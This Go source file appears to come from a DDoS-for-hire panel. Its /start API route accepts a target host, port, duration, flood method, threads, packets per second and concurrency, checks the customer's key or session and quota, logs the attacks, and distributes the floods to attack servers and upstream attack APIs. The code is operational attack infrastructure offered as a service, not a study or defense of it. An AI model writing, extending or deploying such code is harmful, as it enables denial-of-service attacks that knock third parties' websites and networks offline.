package attackapi

import (
	"api/core/database"
	"api/core/master/sessions"
	"api/core/models/apis"
	"api/core/models/floods"
	"api/core/models/functions"
	"api/core/models/server"
	"api/core/models/servers"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"net/url"
	"reflect"
	"strconv"
	"strings"
	"time"
)

func init() {
	Route.NewSub(server.NewRoute("/start", func(w http.ResponseWriter, r *http.Request) {
		type status struct {
			Status  string `json:"status"`
			Message string `json:"message"`
			Attacks []int  `json:"attack_ids"`
		}
		handleError := func(message string) {
			json.NewEncoder(w).Encode(status{Status: "error", Message: message})
		}
		validateTarget := func(target string) bool {
			// Check if the target is an IPv4 address
			if net.ParseIP(target) != nil {
				return true
			}

			parsedURL, err := url.Parse(target)
			if err != nil {
				return false
			}
			host := parsedURL.Hostname()
			if host == "" {
				host = target
			}

			// Perform DNS lookup
			addrs, err := net.LookupHost(host)
			return err == nil && len(addrs) > 0
		}
		switch strings.ToLower(r.Method) {
		case "get":
			key, ok := functions.GetKey(w, r)
			if !ok {
				return
			}
			if !key.HasPermission("api") {
				handleError("You do not have API access!")
				return
			}

			data := functions.GetQuerys(w, r, map[string]bool{
				"target":      true,
				"port":        true,
				"time":        true,
				"method":      true,
				"threads":     false,
				"pps":         false,
				"concurrents": false,
				"subnet":      false,
			})
			if data == nil {
				return
			}

			target := data["target"]
			if target == "" {
				handleError("Target parameter is missing")
				return
			}

			if !validateTarget(target) {
				handleError("Invalid target provided")
				return
			}

			flood := floods.New(data["method"])
			if flood == nil {
				handleError("Invalid attack method provided!")
				return
			}
			flood.Target = data["target"]
			flood.Parent = key.ID
			if _, ok := data["pps"]; ok {
				pps, err := strconv.Atoi(data["pps"])
				if err != nil {
					handleError("Invalid attack pps provided!")
					return
				}
				flood.PPS = pps
			}
			if _, ok := data["threads"]; ok {
				threads, err := strconv.Atoi(data["threads"])
				if err != nil {
					handleError("Invalid thread amount provided!")
					return
				}
				flood.Threads = threads
			}
			if _, ok := data["subnet"]; ok {
				subnet, err := strconv.Atoi(data["subnet"])
				if err != nil {
					handleError("Invalid subnet provided!")
					return
				}
				if subnet < 24 || subnet > 32 {
					handleError("Invalid subnet provided!")
					return
				}
				flood.Subnet = subnet
			}

			//handle cons and durra
			var conns = 1
			ongoing, _ := database.Container.GetRunning(key)
			if len(ongoing) > key.Concurrents {
				handleError("Max Running Attacks!")
			}
			if connsVal, ok := data["concurrents"]; ok {
				if conncurrents, err := strconv.Atoi(connsVal); err != nil || conncurrents+len(ongoing) > key.Concurrents {
					handleError("Invalid concurrent amount provided!")
					return
				} else {
					conns = conncurrents
				}
			}
			if duration, err := strconv.Atoi(data["time"]); err != nil || duration > key.Duration {
				handleError("Invalid attack duration provided or exceeds maximum allowed!")
				return
			} else {
				flood.Duration = duration
			}
			if port, err := strconv.Atoi(data["port"]); err != nil || port < 0 || port > 65535 {
				handleError("Invalid destination port provided!")
				return
			} else {
				flood.Port = port
			}

			// Check available slots
			switch flood.Mtype {
			case 1:
				if database.Container.GlobalRunningType(1) >= servers.Slots()[1]+apis.Slots() {
					handleError("No available slot to start attack!")
					return
				}
			case 2:
				if database.Container.GlobalRunningType(2) >= servers.Slots()[2] {
					handleError("No available slot to start attack!")
					return
				}
			}

			//send attack
			var ids []int
			for i := 0; i < conns; i++ {
				id, err := database.Container.NewAttack(key, flood)
				if err != nil {

					json.NewEncoder(w).Encode(status{Status: "error", Message: "database error occured!"})
					return
				}
				ids = append(ids, id)
				time.Sleep(500 * time.Microsecond)
			}
			if key.HasPermission("admin") {
				go apis.Send(flood)
			}
			for i := 0; i < conns; i++ {
				servers.Distribute(flood)
			}
			functions.WriteJson(w, status{Status: "success", Message: "attack succesfully started", Attacks: ids})
		case "post":
			ok, user := sessions.IsLoggedIn(w, r)
			if !ok {
				return
			}
			r.ParseForm()
			fmt.Println(r.PostForm)
			target := r.PostFormValue("host")
			if !validateTarget(target) {
				handleError("Invalid target provided")
				return
			}
			flood := floods.New(r.PostFormValue("method"))
			if flood == nil {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid attack method provided!"})
				return
			}
			flood.Target = r.PostFormValue("host")
			flood.Parent = user.ID
			var conns = 1
			ongoing, _ := database.Container.GetRunning(user.User)
			if len(ongoing) > user.Concurrents {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "maximum running attacks reached!"})
			}
			if ok := r.PostFormValue("concurrents"); ok != "" {
				val := strings.Split(r.PostFormValue("concurrents"), ".")[0]
				conncurrents, err := strconv.Atoi(val)
				if err != nil {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid concurrent amount provided!"})
					return
				} else if err == nil && conncurrents+len(ongoing) > user.Concurrents {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "you're trying to attack with more concurrents then u have available!"})
					return
				}
				conns = conncurrents
			}
			if ok := r.PostFormValue("threads"); ok != "" {
				val := strings.Split(r.PostFormValue("threads"), ".")[0]
				threads, err := strconv.Atoi(val)
				if err != nil {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid thread amount provided!"})
					return
				}
				flood.Threads = threads
			}
			if ok := r.PostFormValue("pps"); ok != "" {
				val := strings.Split(r.PostFormValue("pps"), ".")[0]
				pps, err := strconv.Atoi(val)
				if err != nil {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid pps amount provided!"})
					return
				}
				flood.PPS = pps
			}
			duration, err := strconv.Atoi(r.PostFormValue("duration"))
			if err != nil || duration <= 0 || duration > user.Duration {
				handleError("Invalid attack duration provided or exceeds maximum allowed!")
				log.Println(err)
				return
			}
			flood.Duration = duration
		
			port, err := strconv.Atoi(r.PostFormValue("port"))
			if err != nil || port < 0 || port > 65535 {
				handleError("Invalid destination port provided!")
				return
			}
			flood.Port = port
			switch flood.Mtype {
			case 1:
				if database.Container.GlobalRunningType(1) >= servers.Slots()[1]+apis.Slots() {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "no available slot to start attack!"})
					return
				}
			case 2:
				if database.Container.GlobalRunningType(2) >= servers.Slots()[2] {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "no available slot to start attack!"})
					return
				}
			}
			var ids []int
			for i := 0; i < conns; i++ {
				id, err := database.Container.NewAttack(user.User, flood)
				if err != nil {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "database error occured!"})
					return
				}

				servers.Distribute(flood)
				ids = append(ids, id)
			}
			go apis.Send(flood)
			functions.WriteJson(w, status{Status: "success", Message: "attack succesfully started", Attacks: ids})
		}

	}))
}

func Copy(source interface{}, destin interface{}) {
    srcValue := reflect.ValueOf(source)
    destValue := reflect.ValueOf(destin)

    // Ensure destin is a pointer
    if destValue.Kind() != reflect.Ptr {
        panic("destin must be a pointer")
    }

    // Get the element value of source
    if srcValue.Kind() == reflect.Ptr {
        srcValue = srcValue.Elem()
    }

    // Ensure destin points to a value of the same type as source
    if srcValue.Type() != destValue.Elem().Type() {
        panic("source and destin must be of the same type")
    }

    // Set the value of destin
    destValue.Elem().Set(srcValue)
}